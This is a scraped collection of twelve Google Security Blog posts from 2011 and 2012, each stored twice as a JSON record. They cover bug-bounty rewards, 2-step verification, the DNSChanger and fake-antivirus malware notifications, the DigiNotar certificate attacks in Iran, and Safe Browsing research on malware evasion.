{"website": "Google-Security", "title": "\nSpurring more vulnerability research through increased rewards\n", "author": ["Posted by Adam Mein and Michal Zalewski, Security Team"], "link": "https://security.googleblog.com/2012/04/spurring-more-vulnerability-research.html", "abstract": "                             Posted by Adam Mein and Michal Zalewski, Security Team     We  recently marked  the anniversary of our  Vulnerability Reward Program , possibly the first permanent program of its kind for web properties. This collaboration with the security research community has far surpassed our expectations: we have received over 780 qualifying vulnerability reports that span across the hundreds of Google-developed services, as well as the software written by fifty or so companies that we have acquired. In just over a year, the program paid out around $460,000 to roughly 200 individuals. We&#8217;re confident beyond any doubt the program has made Google users safer.    Today, to celebrate the success of this effort and to underscore our commitment to security, we are rolling out  updated rules  for our program &#8212; including new reward amounts for critical bugs:      $20,000  for qualifying vulnerabilities that the reward panel determines will allow code execution on our production systems.&nbsp;        $10,000  for SQL injection and equivalent vulnerabilities; and for certain types of information disclosure, authentication, and authorization bypass bugs.&nbsp;       Up to  $3,133.7  for many types of XSS, XSRF, and other high-impact flaws in highly sensitive applications.&nbsp;    To help focus the research on bringing the greatest benefit to our users, the new rules offer reduced rewards for vulnerabilities discovered in non-integrated acquisitions and for lower risk issues. For example, while every flaw deserves appropriate attention, we are likely to issue a higher reward for a cross-site scripting vulnerability in  Google Wallet  than one in  Google Art Project , where the potential risk to user data is significantly smaller.    Happy hunting - and if you find a security problem, please  let us know !                                   Posted by Adam Mein and Michal Zalewski, Security Team  We recently marked the anniversary of our Vulnerability Reward Program, possibly the first permanent program of its kind for web properties. This collaboration with the security research community has far surpassed our expectations: we have received over 780 qualifying vulnerability reports that span across the hundreds of Google-developed services, as well as the software written by fifty or so companies that we have acquired. In just over a year, the program paid out around $460,000 to roughly 200 individuals. We’re confident beyond any doubt the program has made Google users safer.  Today, to celebrate the success of this effort and to underscore our commitment to security, we are rolling out updated rules for our program — including new reward amounts for critical bugs:  $20,000 for qualifying vulnerabilities that the reward panel determines will allow code execution on our production systems.    $10,000 for SQL injection and equivalent vulnerabilities; and for certain types of information disclosure, authentication, and authorization bypass bugs.    Up to $3,133.7 for many types of XSS, XSRF, and other high-impact flaws in highly sensitive applications.   To help focus the research on bringing the greatest benefit to our users, the new rules offer reduced rewards for vulnerabilities discovered in non-integrated acquisitions and for lower risk issues. For example, while every flaw deserves appropriate attention, we are likely to issue a higher reward for a cross-site scripting vulnerability in Google Wallet than one in Google Art Project, where the potential risk to user data is significantly smaller.  Happy hunting - and if you find a security problem, please let us know!     ", "date": "April 23, 2012"},
{"website": "Google-Security", "title": "\nAn improved Google Authenticator app to celebrate millions of 2-step verification users\n", "author": ["Posted by Sara \"Scout\" Sinclair, Associate Product Manager, Google Security Team"], "link": "https://security.googleblog.com/2012/03/improved-google-authenticator-app-to.html", "abstract": "                             Posted by Sara \"Scout\" Sinclair, Associate Product Manager, Google Security Team   Since we first made 2-step verification available to  all Google users  in February of 2011, millions of people around the world have chosen to use this extra layer of security to protect their Google Accounts. Thousands more are signing up every day. And recently, we updated the feature&#8217;s companion smartphone app,  Google Authenticator , for Android users.  2-step verification works by requiring users to enter a verification code when signing in using a computer they haven&#8217;t previously marked as &#8220; trusted .&#8221; Many users choose to receive their codes via SMS or voice call, but smartphone users also have the option to generate codes on their phone by  installing the Google Authenticator app  &#8212; an option that is particularly useful while traveling, or where cellular coverage is unreliable. You can use Google Authenticator to generate a valid code even when your phone isn&#8217;t connected to a cellular or data network.  We want 2-step verification to be simple to use, and therefore we are working continually to make it easier for users to sign up, manage their settings, and maintain easy access to their verification codes at any time and from anywhere. Our updated Google Authenticator app has an improved look-and-feel, as well as fundamental upgrades to the back-end security and infrastructure that necessitated the migration to a new app. Future improvements, however, will use the familiar Android update procedure.  Current Google Authenticator users will be prompted to upgrade to the new version when they launch the app. We&#8217;ve worked hard to make the upgrade process as smooth as possible, but if you have questions please refer to the  Help Center article  for more information. And, if you aren&#8217;t already a 2-step verification user, we encourage you to  give it a try .                                   Posted by Sara \"Scout\" Sinclair, Associate Product Manager, Google Security TeamSince we first made 2-step verification available to all Google users in February of 2011, millions of people around the world have chosen to use this extra layer of security to protect their Google Accounts. Thousands more are signing up every day. And recently, we updated the feature’s companion smartphone app, Google Authenticator, for Android users.2-step verification works by requiring users to enter a verification code when signing in using a computer they haven’t previously marked as “trusted.” Many users choose to receive their codes via SMS or voice call, but smartphone users also have the option to generate codes on their phone by installing the Google Authenticator app — an option that is particularly useful while traveling, or where cellular coverage is unreliable. You can use Google Authenticator to generate a valid code even when your phone isn’t connected to a cellular or data network.We want 2-step verification to be simple to use, and therefore we are working continually to make it easier for users to sign up, manage their settings, and maintain easy access to their verification codes at any time and from anywhere. Our updated Google Authenticator app has an improved look-and-feel, as well as fundamental upgrades to the back-end security and infrastructure that necessitated the migration to a new app. Future improvements, however, will use the familiar Android update procedure.Current Google Authenticator users will be prompted to upgrade to the new version when they launch the app. We’ve worked hard to make the upgrade process as smooth as possible, but if you have questions please refer to the Help Center article for more information. And, if you aren’t already a 2-step verification user, we encourage you to give it a try.     ", "date": "March 30, 2012"},
{"website": "Google-Security", "title": "\nNotifying users affected by the DNSChanger malware\n", "author": ["Posted by Damian Menscher, Security Engineer"], "link": "https://security.googleblog.com/2012/05/notifying-users-affected-by-dnschanger.html", "abstract": "                             Posted by Damian Menscher, Security Engineer     Starting today we&#8217;re undertaking an effort to notify roughly half a million people whose computers or home routers are infected with a well-publicized form of malware known as DNSChanger. After successfully alerting a million users  last summer  to a different type of malware, we&#8217;ve replicated this method and have started showing warnings via a special message that will appear at the top of the Google search results page for users with affected devices.             The  Domain Name System  (DNS) translates familiar web address names like google.com into a numerical address that computers use to send traffic to the right place. The DNSChanger malware modifies DNS settings to use malicious servers that point users to fake sites and other harmful locations. DNSChanger attempts to modify the settings on home routers as well, meaning other computers and mobile devices may also be affected.    Since the FBI and Estonian law enforcement arrested a group of people and transferred control of the rogue DNS servers to the Internet Systems Consortium in November 2011, various ISPs and other groups have attempted to alert victims. However, many of these campaigns have had limited success because they could not target the affected users, or did not appear in the user&#8217;s preferred language (only half the affected users speak English as their primary language). At the current disinfection rate hundreds of thousands of devices will still be infected when the court order expires on July 9th and the replacement DNS servers are shut down. At that time, any remaining infected machines may experience slowdowns or completely lose Internet access.    Our goal with this notification is to raise awareness of DNSChanger among affected users. We believe directly messaging affected users on a trusted site and in their preferred language will produce the best possible results. While we expect to notify over 500,000 users within a week, we realize we won&#8217;t reach every affected user. Some ISPs have been taking their own actions, a few of which will prevent our warning from being displayed on affected devices. We also can&#8217;t guarantee that our recommendations will always clean infected devices completely, so some users may need to seek additional help. These conditions aside, if more devices are cleaned and steps are taken to better secure the machines against further abuse, the notification effort will be well worth it.                                   Posted by Damian Menscher, Security Engineer  Starting today we’re undertaking an effort to notify roughly half a million people whose computers or home routers are infected with a well-publicized form of malware known as DNSChanger. After successfully alerting a million users last summer to a different type of malware, we’ve replicated this method and have started showing warnings via a special message that will appear at the top of the Google search results page for users with affected devices.     The Domain Name System (DNS) translates familiar web address names like google.com into a numerical address that computers use to send traffic to the right place. The DNSChanger malware modifies DNS settings to use malicious servers that point users to fake sites and other harmful locations. DNSChanger attempts to modify the settings on home routers as well, meaning other computers and mobile devices may also be affected.  Since the FBI and Estonian law enforcement arrested a group of people and transferred control of the rogue DNS servers to the Internet Systems Consortium in November 2011, various ISPs and other groups have attempted to alert victims. However, many of these campaigns have had limited success because they could not target the affected users, or did not appear in the user’s preferred language (only half the affected users speak English as their primary language). At the current disinfection rate hundreds of thousands of devices will still be infected when the court order expires on July 9th and the replacement DNS servers are shut down. At that time, any remaining infected machines may experience slowdowns or completely lose Internet access.  Our goal with this notification is to raise awareness of DNSChanger among affected users. We believe directly messaging affected users on a trusted site and in their preferred language will produce the best possible results. While we expect to notify over 500,000 users within a week, we realize we won’t reach every affected user. Some ISPs have been taking their own actions, a few of which will prevent our warning from being displayed on affected devices. We also can’t guarantee that our recommendations will always clean infected devices completely, so some users may need to seek additional help. These conditions aside, if more devices are cleaned and steps are taken to better secure the machines against further abuse, the notification effort will be well worth it.     ", "date": "May 22, 2012"},
{"website": "Google-Security", "title": "\nMicrosoft XML vulnerability under active exploitation\n", "author": ["Posted by Andrew Lyons, Security Engineer"], "link": "https://security.googleblog.com/2012/06/microsoft-xml-vulnerability-under.html", "abstract": "                             Posted by Andrew Lyons, Security Engineer     Today Microsoft issued a  Security Advisory  describing a vulnerability in the Microsoft XML component. We discovered this vulnerability&#8212;which is leveraged via an uninitialized variable&#8212;being actively exploited in the wild for targeted attacks, and we reported it to Microsoft on May 30th. Over the past two weeks, Microsoft has been responsive to the issue and has been working with us. These attacks are being distributed both via malicious web pages intended for Internet Explorer users and through Office documents. Users running Windows XP up to and including Windows 7 are known to be vulnerable.    As part of the advisory, Microsoft suggests installing a  Fix it solution  that will prevent the exploitation of this vulnerability. We strongly recommend Internet Explorer and Microsoft Office users immediately install the Fix it while Microsoft develops and publishes a final fix as part of a future advisory.                                   Posted by Andrew Lyons, Security Engineer  Today Microsoft issued a Security Advisory describing a vulnerability in the Microsoft XML component. We discovered this vulnerability—which is leveraged via an uninitialized variable—being actively exploited in the wild for targeted attacks, and we reported it to Microsoft on May 30th. Over the past two weeks, Microsoft has been responsive to the issue and has been working with us. These attacks are being distributed both via malicious web pages intended for Internet Explorer users and through Office documents. Users running Windows XP up to and including Windows 7 are known to be vulnerable.  As part of the advisory, Microsoft suggests installing a Fix it solution that will prevent the exploitation of this vulnerability. We strongly recommend Internet Explorer and Microsoft Office users immediately install the Fix it while Microsoft develops and publishes a final fix as part of a future advisory.     ", "date": "June 12, 2012"},
{"website": "Google-Security", "title": "\nAn update on attempted man-in-the-middle attacks\n", "author": ["Posted by Heather Adkins, Information Security Manager"], "link": "https://security.googleblog.com/2011/08/update-on-attempted-man-in-middle.html", "abstract": "                             Posted by Heather Adkins, Information Security Manager \r \r Today we received reports of attempted SSL man-in-the-middle (MITM) attacks against Google users, whereby someone tried to get between them and encrypted Google services. The people affected were primarily located in Iran. The attacker used a fraudulent SSL certificate issued by DigiNotar, a root certificate authority that should not issue certificates for Google (and has since revoked it).\r \r Google Chrome users were protected from this attack because Chrome was able to  detect  the fraudulent certificate.\r \r To further protect the safety and privacy of our users, we plan to disable the DigiNotar certificate authority in Chrome while investigations continue. Mozilla also  moved quickly  to protect its users. This means that Chrome and Firefox users will receive alerts if they try to visit websites that use DigiNotar certificates. Microsoft also has  taken prompt action .\r \r To help deter unwanted surveillance, we recommend that users, especially those in Iran, keep their web browsers and operating systems up to date and pay attention to web browser security warnings.\r \r   Update  Aug 30:  Added information about Microsoft's response.\r \r   Update  Sept 3:  Our top priority is to protect the privacy and security of our users. Based on the findings and decision of the Dutch government, as well as conversations with other browser makers, we have decided to reject all of the Certificate Authorities operated by DigiNotar. We encourage DigiNotar to provide a complete analysis of the situation.                                   Posted by Heather Adkins, Information Security Manager\r\rToday we received reports of attempted SSL man-in-the-middle (MITM) attacks against Google users, whereby someone tried to get between them and encrypted Google services. The people affected were primarily located in Iran. The attacker used a fraudulent SSL certificate issued by DigiNotar, a root certificate authority that should not issue certificates for Google (and has since revoked it).\r\rGoogle Chrome users were protected from this attack because Chrome was able to detect the fraudulent certificate.\r\rTo further protect the safety and privacy of our users, we plan to disable the DigiNotar certificate authority in Chrome while investigations continue. Mozilla also moved quickly to protect its users. This means that Chrome and Firefox users will receive alerts if they try to visit websites that use DigiNotar certificates. Microsoft also has taken prompt action.\r\rTo help deter unwanted surveillance, we recommend that users, especially those in Iran, keep their web browsers and operating systems up to date and pay attention to web browser security warnings.\r\rUpdate Aug 30: Added information about Microsoft's response.\r\rUpdate Sept 3: Our top priority is to protect the privacy and security of our users. Based on the findings and decision of the Dutch government, as well as conversations with other browser makers, we have decided to reject all of the Certificate Authorities operated by DigiNotar. We encourage DigiNotar to provide a complete analysis of the situation.     ", "date": "August 29, 2011"},
{"website": "Google-Security", "title": "\nFour Years of Web Malware\n", "author": ["Posted by Lucas Ballard and Niels Provos, Google Security Team"], "link": "https://security.googleblog.com/2011/08/four-years-of-web-malware.html", "abstract": "                             Posted by Lucas Ballard and Niels Provos, Google Security Team      Google&#8217;s Safe Browsing initiative has been protecting users from web pages that install malware for over five years now. Each day we show around 3 million malware warnings to over four hundred million users whose browsers implement the Safe Browsing API. Like other service providers, we are engaged in an arms race with malware distributors. Over time, we have adapted our original system to incorporate new detection algorithms that allow us to keep pace. We recently completed an analysis of four years of data that explores the evasive techniques that malware distributors employ. We compiled the results in a technical report, entitled &#8220; Trends in Circumventing Web-Malware Detection .&#8221;     Below are a few of the research highlights, but we recommend reviewing the  full report  for details on our methodology and measurements. The analysis covers approximately 160 million web pages hosted on approximately 8 million sites.      Social Engineering    Social engineering is a malware distribution mechanism that relies on tricking a user into installing malware. Typically, the malware is disguised as an anti-virus product or browser plugin. Social engineering has increased in frequency significantly and is still rising. However, it&#8217;s important to keep this growth in perspective &#8212; sites that rely on social engineering comprise only 2% of all sites that distribute malware.             Number of sites distributing Social Engineering Malware and Exploits over time       Drive-by Download Exploit Trends    Far more common than social engineering, malicious pages install malware after exploiting a vulnerability in the browser or a plugin. This type of infection is often called a drive-by download. Our analysis of which vulnerabilities are actively being exploited over time shows that adversaries quickly switch to new and more reliable exploits to help avoid detection. The graph below shows the ratio of exploits targeting a vulnerability in one CVE to all exploits over time.  Most vulnerabilities are exploited only for a short period of time until new vulnerabilities become available. A prominent exception is the MDAC vulnerability which is present in most exploit kits.              Prevalence of exploits targeting specific CVEs over time          Increase in IP Cloaking    Malware distributors are increasingly relying upon &#8216;cloaking&#8217; as a technique to evade detection.  The concept behind cloaking is simple: serve benign content to detection systems, but serve malicious content to normal web page visitors. Over the years, we have seen more malicious sites engaging in IP cloaking. To bypass the cloaking defense, we run our scanners in different ways to mimic regular user traffic.              Number of sites practicing IP Cloaking over time       New Detection Capabilities    Our report analyzed four years of data to uncover trends in malware distribution on the web, and it demonstrates the ongoing tension between malware distributors and malware detectors. To help protect Internet users, even those who don&#8217;t use Google, we have updated the Safe Browsing infrastructure over the years to incorporate many state-of-the-art malware detection technologies. We hope the findings outlined in this report will help other researchers in this area and raise awareness of some of the current challenges.                                      Posted by Lucas Ballard and Niels Provos, Google Security Team   Google’s Safe Browsing initiative has been protecting users from web pages that install malware for over five years now. Each day we show around 3 million malware warnings to over four hundred million users whose browsers implement the Safe Browsing API. Like other service providers, we are engaged in an arms race with malware distributors. Over time, we have adapted our original system to incorporate new detection algorithms that allow us to keep pace. We recently completed an analysis of four years of data that explores the evasive techniques that malware distributors employ. We compiled the results in a technical report, entitled “Trends in Circumventing Web-Malware Detection.”   Below are a few of the research highlights, but we recommend reviewing the full report for details on our methodology and measurements. The analysis covers approximately 160 million web pages hosted on approximately 8 million sites.   Social Engineering  Social engineering is a malware distribution mechanism that relies on tricking a user into installing malware. Typically, the malware is disguised as an anti-virus product or browser plugin. Social engineering has increased in frequency significantly and is still rising. However, it’s important to keep this growth in perspective — sites that rely on social engineering comprise only 2% of all sites that distribute malware.      Number of sites distributing Social Engineering Malware and Exploits over time  Drive-by Download Exploit Trends  Far more common than social engineering, malicious pages install malware after exploiting a vulnerability in the browser or a plugin. This type of infection is often called a drive-by download. Our analysis of which vulnerabilities are actively being exploited over time shows that adversaries quickly switch to new and more reliable exploits to help avoid detection. The graph below shows the ratio of exploits targeting a vulnerability in one CVE to all exploits over time.  Most vulnerabilities are exploited only for a short period of time until new vulnerabilities become available. A prominent exception is the MDAC vulnerability which is present in most exploit kits.     Prevalence of exploits targeting specific CVEs over time    Increase in IP Cloaking  Malware distributors are increasingly relying upon ‘cloaking’ as a technique to evade detection.  The concept behind cloaking is simple: serve benign content to detection systems, but serve malicious content to normal web page visitors. Over the years, we have seen more malicious sites engaging in IP cloaking. To bypass the cloaking defense, we run our scanners in different ways to mimic regular user traffic.     Number of sites practicing IP Cloaking over time  New Detection Capabilities  Our report analyzed four years of data to uncover trends in malware distribution on the web, and it demonstrates the ongoing tension between malware distributors and malware detectors. To help protect Internet users, even those who don’t use Google, we have updated the Safe Browsing infrastructure over the years to incorporate many state-of-the-art malware detection technologies. We hope the findings outlined in this report will help other researchers in this area and raise awareness of some of the current challenges.      ", "date": "August 17, 2011"},
{"website": "Google-Security", "title": "\nSafe Browsing Alerts for Network Administrators is graduating from Labs\n", "author": ["Posted by Nav Jagpal, Security Team"], "link": "https://security.googleblog.com/2011/10/safe-browsing-alerts-for-network.html", "abstract": "                             Posted by Nav Jagpal, Security Team     Today, we&#8217;re congratulating Safe Browsing Alerts for Network Administrators on its graduation from Labs to its new home at  http://www.google.com/safebrowsing/alerts/     We  announced  the tool about a year ago and have received a lot of positive feedback. Network administrators, large and small, are using the information we provide about malware and phishing URLs to clean up their networks and help webmasters make their sites safer. Earlier this year,  AusCert recognized our efforts  by awarding Safe Browsing Alerts for Network Administrators the title of &#8220;Best Security Initiative.&#8221;     If you&#8217;re a network administrator and haven&#8217;t yet registered your AS, you can do so  here .                                   Posted by Nav Jagpal, Security Team  Today, we’re congratulating Safe Browsing Alerts for Network Administrators on its graduation from Labs to its new home at http://www.google.com/safebrowsing/alerts/  We announced the tool about a year ago and have received a lot of positive feedback. Network administrators, large and small, are using the information we provide about malware and phishing URLs to clean up their networks and help webmasters make their sites safer. Earlier this year, AusCert recognized our efforts by awarding Safe Browsing Alerts for Network Administrators the title of “Best Security Initiative.”   If you’re a network administrator and haven’t yet registered your AS, you can do so here.     ", "date": "October 6, 2011"},
{"website": "Google-Security", "title": "\nGmail account security in Iran\n", "author": ["Posted by Eric Grosse, VP Security Engineering"], "link": "https://security.googleblog.com/2011/09/gmail-account-security-in-iran.html", "abstract": "                             Posted by Eric Grosse, VP Security Engineering   We  learned last week  that the compromise of a Dutch company involved with verifying the authenticity of websites could have put the Internet communications of many Iranians at risk, including their Gmail. While Google&#8217;s internal systems were not compromised, we are directly contacting possibly affected users and providing similar information below because our top priority is to protect the privacy and security of our users.  While users of the Chrome browser were protected from this threat, we advise all users in Iran to take concrete steps to secure their accounts:    Change your password. You may have already been asked to change your password when you signed in to your Google Account. If not, you can change it  here .  Verify your account recovery options. Secondary email addresses, phone numbers, and other information can help you regain access to your account if you lose your password. Check to be sure your recovery options are correct and up to date  here .   Check the websites and applications that are allowed to access your account, and revoke any that are unfamiliar  here .   Check your Gmail settings for suspicious  forwarding addresses  or  delegated accounts .   Pay careful attention to  warnings that appear  in your web browser and don&#8217;t click past them.  For more ways to secure your account, you can visit  http://www.google.com/help/security . If you believe your account has been compromised, you can start the recovery process  here .                                    Posted by Eric Grosse, VP Security EngineeringWe learned last week that the compromise of a Dutch company involved with verifying the authenticity of websites could have put the Internet communications of many Iranians at risk, including their Gmail. While Google’s internal systems were not compromised, we are directly contacting possibly affected users and providing similar information below because our top priority is to protect the privacy and security of our users.While users of the Chrome browser were protected from this threat, we advise all users in Iran to take concrete steps to secure their accounts:Change your password. You may have already been asked to change your password when you signed in to your Google Account. If not, you can change it here.Verify your account recovery options. Secondary email addresses, phone numbers, and other information can help you regain access to your account if you lose your password. Check to be sure your recovery options are correct and up to date here. Check the websites and applications that are allowed to access your account, and revoke any that are unfamiliar here. Check your Gmail settings for suspicious forwarding addresses or delegated accounts. Pay careful attention to warnings that appear in your web browser and don’t click past them.For more ways to secure your account, you can visit http://www.google.com/help/security. If you believe your account has been compromised, you can start the recovery process here.     ", "date": "September 8, 2011"},
{"website": "Google-Security", "title": "\nReminder: Safe Browsing version 1 API turning down December 1\n", "author": ["Posted by Brian Ryner, Security Team"], "link": "https://security.googleblog.com/2011/11/reminder-safe-browsing-version-1-api.html", "abstract": "                             Posted by Brian Ryner, Security Team   In May we  announced  that we are ending support for the Safe Browsing protocol version 1 on December 1 in order to focus our resources on the  new version 2 API  and the  lookup service . These new APIs provide simpler and more efficient access to the same data, and they use significantly less bandwidth. If you haven't yet migrated off of the version 1 API, we encourage you to do so as soon as possible. Our  earlier post  contains links to documentation for the new protocol version and other resources to help you make the transition smoothly.  After December 1, we will remove all data from the version 1 API list to ensure that any remaining clients do not have false positives in their database. After January 1, 2012, we will turn off the version 1 service completely, and all requests will return a 404 error.  Thanks for your cooperation, and enjoy using the next generation of Safe Browsing.                                   Posted by Brian Ryner, Security TeamIn May we announced that we are ending support for the Safe Browsing protocol version 1 on December 1 in order to focus our resources on the new version 2 API and the lookup service. These new APIs provide simpler and more efficient access to the same data, and they use significantly less bandwidth. If you haven't yet migrated off of the version 1 API, we encourage you to do so as soon as possible. Our earlier post contains links to documentation for the new protocol version and other resources to help you make the transition smoothly.After December 1, we will remove all data from the version 1 API list to ensure that any remaining clients do not have false positives in their database. After January 1, 2012, we will turn off the version 1 service completely, and all requests will return a 404 error.Thanks for your cooperation, and enjoy using the next generation of Safe Browsing.     ", "date": "November 22, 2011"},
{"website": "Google-Security", "title": "\nSecurity warnings for suspected state-sponsored attacks\n", "author": ["Posted by Eric Grosse, VP Security Engineering"], "link": "https://security.googleblog.com/2012/06/security-warnings-for-suspected-state.html", "abstract": "                             Posted by Eric Grosse, VP Security Engineering     We are constantly on the lookout for malicious activity on our systems, in particular attempts by third parties to log into users&#8217; accounts unauthorized. When we have specific intelligence&#8212;either directly from users or from our own monitoring efforts&#8212;we show clear warning signs and put in place extra roadblocks to thwart these bad actors.    Today, we&#8217;re taking that a step further for a subset of our users, who we believe may be the target of state-sponsored attacks. You can see what this new warning looks like here:               If you see this warning it does not necessarily mean that your account has been hijacked. It just means that we believe you may be a target, of phishing or malware for example, and that you should take immediate steps to secure your account. Here are some things you should do immediately: create a unique password that has a good mix of capital and lowercase letters, as well punctuation marks and numbers; enable 2-step verification as additional security; and update your browser, operating system, plugins, and document editors. Attackers often send links to fake sign-in pages to try to steal your password, so be careful about where you sign in to Google and look for  https://accounts.google.com/  in your browser bar. These warnings are not being shown because Google&#8217;s internal systems have been compromised or because of a particular attack.      You might ask how we know this activity is state-sponsored. We can&#8217;t go into the details without giving away information that would be helpful to these bad actors, but our detailed analysis&#8212;as well as victim reports&#8212;strongly suggest the involvement of states or groups that are state-sponsored.    We believe it is our duty to be proactive in notifying users about attacks or potential attacks so that they can take action to protect their information. And we will continue to update these notifications based on the latest information.                                   Posted by Eric Grosse, VP Security Engineering  We are constantly on the lookout for malicious activity on our systems, in particular attempts by third parties to log into users’ accounts unauthorized. When we have specific intelligence—either directly from users or from our own monitoring efforts—we show clear warning signs and put in place extra roadblocks to thwart these bad actors.  Today, we’re taking that a step further for a subset of our users, who we believe may be the target of state-sponsored attacks. You can see what this new warning looks like here:      If you see this warning it does not necessarily mean that your account has been hijacked. It just means that we believe you may be a target, of phishing or malware for example, and that you should take immediate steps to secure your account. Here are some things you should do immediately: create a unique password that has a good mix of capital and lowercase letters, as well punctuation marks and numbers; enable 2-step verification as additional security; and update your browser, operating system, plugins, and document editors. Attackers often send links to fake sign-in pages to try to steal your password, so be careful about where you sign in to Google and look for https://accounts.google.com/ in your browser bar. These warnings are not being shown because Google’s internal systems have been compromised or because of a particular attack.    You might ask how we know this activity is state-sponsored. We can’t go into the details without giving away information that would be helpful to these bad actors, but our detailed analysis—as well as victim reports—strongly suggest the involvement of states or groups that are state-sponsored.  We believe it is our duty to be proactive in notifying users about attacks or potential attacks so that they can take action to protect their information. And we will continue to update these notifications based on the latest information.     ", "date": "June 5, 2012"},
{"website": "Google-Security", "title": "\nUsing data to protect people from malware\n", "author": ["Posted by Damian Menscher, Security Engineer"], "link": "https://security.googleblog.com/2011/07/using-data-to-protect-people-from.html", "abstract": "                             Posted by Damian Menscher, Security Engineer    (Cross-posted from the  Official Google Blog )   The Internet brings remarkable benefits to society. Unfortunately, some people use it for harm and their own gain at the expense of others. We believe in the power of the web and information, and we work every day to detect potential abuse of our services and ward off attacks.  As we work to protect our users and their information, we sometimes discover unusual patterns of activity. Recently, we found some unusual search traffic while performing routine maintenance on one of our data centers. After collaborating with security engineers at several companies that were sending this modified traffic, we determined that the computers exhibiting this behavior were infected with a particular strain of malicious software, or &#8220;malware.&#8221; As a result of this discovery, today some people will see a prominent notification at the top of their Google web search results:        This particular malware causes infected computers to send traffic to Google through a small number of intermediary servers called &#8220;proxies.&#8221; We hope that by taking steps to notify users whose traffic is coming through these proxies, we can help them update their antivirus software and remove the infections.  We hope to use the knowledge we&#8217;ve gathered to assist as many people as possible. In case our notice doesn&#8217;t reach everyone directly, you can run a system scan on your computer yourself by following the steps in our  Help Center article .   Updated July 20, 2011:  We've seen a few common questions we thought we'd address here:   The malware appears to have gotten onto users' computers from one of roughly a hundred variants of fake antivirus, or \"fake AV\" software that has been in circulation for a while. We aren't aware of a common name for the malware.  We believe a couple million machines are affected by this malware.  We've heard from a number of you that you're thinking about the potential for an attacker to copy our notice and attempt to point users to a dangerous site instead. It's a good security practice to be cautious about the links you click, so the spirit of those comments is spot-on. We thought about this, too, which is why the notice appears only at the top of our search results page. Falsifying the message on this page would require prior compromise of that computer, so the notice is not a risk to additional users.   In the meantime, we've been able to successfully warn hundreds of thousands of users that their computer is infected. These are people who otherwise may never have known.                                     Posted by Damian Menscher, Security Engineer(Cross-posted from the Official Google Blog)The Internet brings remarkable benefits to society. Unfortunately, some people use it for harm and their own gain at the expense of others. We believe in the power of the web and information, and we work every day to detect potential abuse of our services and ward off attacks.As we work to protect our users and their information, we sometimes discover unusual patterns of activity. Recently, we found some unusual search traffic while performing routine maintenance on one of our data centers. After collaborating with security engineers at several companies that were sending this modified traffic, we determined that the computers exhibiting this behavior were infected with a particular strain of malicious software, or “malware.” As a result of this discovery, today some people will see a prominent notification at the top of their Google web search results:This particular malware causes infected computers to send traffic to Google through a small number of intermediary servers called “proxies.” We hope that by taking steps to notify users whose traffic is coming through these proxies, we can help them update their antivirus software and remove the infections.We hope to use the knowledge we’ve gathered to assist as many people as possible. In case our notice doesn’t reach everyone directly, you can run a system scan on your computer yourself by following the steps in our Help Center article.Updated July 20, 2011: We've seen a few common questions we thought we'd address here:The malware appears to have gotten onto users' computers from one of roughly a hundred variants of fake antivirus, or \"fake AV\" software that has been in circulation for a while. We aren't aware of a common name for the malware.We believe a couple million machines are affected by this malware.We've heard from a number of you that you're thinking about the potential for an attacker to copy our notice and attempt to point users to a dangerous site instead. It's a good security practice to be cautious about the links you click, so the spirit of those comments is spot-on. We thought about this, too, which is why the notice appears only at the top of our search results page. Falsifying the message on this page would require prior compromise of that computer, so the notice is not a risk to additional users. In the meantime, we've been able to successfully warn hundreds of thousands of users that their computer is infected. These are people who otherwise may never have known.     ", "date": "July 19, 2011"},
{"website": "Google-Security", "title": "\n2-step verification: stay safe around the world in 40 languages\n", "author": ["Posted by Nishit Shah, Product Manager, Google Security"], "link": "https://security.googleblog.com/2011/07/2-step-verification-stay-safe-around.html", "abstract": "                             Posted by Nishit Shah, Product Manager, Google Security      (Cross-posted from the  Official Google Blog )     Earlier this year, we  introduced  a security feature called  2-step verification  that helps protect your Google Account from threats like password compromise and identity theft. By entering a one-time verification code from your phone after you type your password, you can make it much tougher for an unauthorized person to gain access to your account.    People have told us how much they like the feature, which is why we're thrilled to offer 2-step verification in 40 languages and in more than 150 countries. There&#8217;s never been a better time to set it up: Examples in the news of password theft and data breaches constantly remind us to stay on our toes and take advantage of tools to properly secure our valuable online information. Email, social networking and other online accounts still get compromised today, but 2-step verification cuts those risks significantly.    We recommend investing some time in keeping your information safe by watching our  2-step verification video  to learn how to quickly increase your Google Account&#8217;s resistance to common problems like reused passwords and  malware and phishing scams . Wherever you are in the world,  sign up for 2-step verification  and help keep yourself one step ahead of the bad guys.    To learn more about online safety tips and resources, visit our ongoing security  blog series , and review a couple of simple  tips and tricks  for online security. Also, watch our video about  five easy ways  to help you stay safe and secure as you browse.      Update  on 12/1/11 : We recently made 2-step verification available for users in even more places, including Iran, Japan, Liberia, Myanmar (Burma), Sudan and Syria. This enhanced security feature for Google Accounts is now available in more than 175 countries.                                   Posted by Nishit Shah, Product Manager, Google Security  (Cross-posted from the Official Google Blog)  Earlier this year, we introduced a security feature called 2-step verification that helps protect your Google Account from threats like password compromise and identity theft. By entering a one-time verification code from your phone after you type your password, you can make it much tougher for an unauthorized person to gain access to your account.  People have told us how much they like the feature, which is why we're thrilled to offer 2-step verification in 40 languages and in more than 150 countries. There’s never been a better time to set it up: Examples in the news of password theft and data breaches constantly remind us to stay on our toes and take advantage of tools to properly secure our valuable online information. Email, social networking and other online accounts still get compromised today, but 2-step verification cuts those risks significantly.  We recommend investing some time in keeping your information safe by watching our 2-step verification video to learn how to quickly increase your Google Account’s resistance to common problems like reused passwords and malware and phishing scams. Wherever you are in the world, sign up for 2-step verification and help keep yourself one step ahead of the bad guys.  To learn more about online safety tips and resources, visit our ongoing security blog series, and review a couple of simple tips and tricks for online security. Also, watch our video about five easy ways to help you stay safe and secure as you browse.  Update on 12/1/11: We recently made 2-step verification available for users in even more places, including Iran, Japan, Liberia, Myanmar (Burma), Sudan and Syria. This enhanced security feature for Google Accounts is now available in more than 175 countries.     ", "date": "July 28, 2011"},
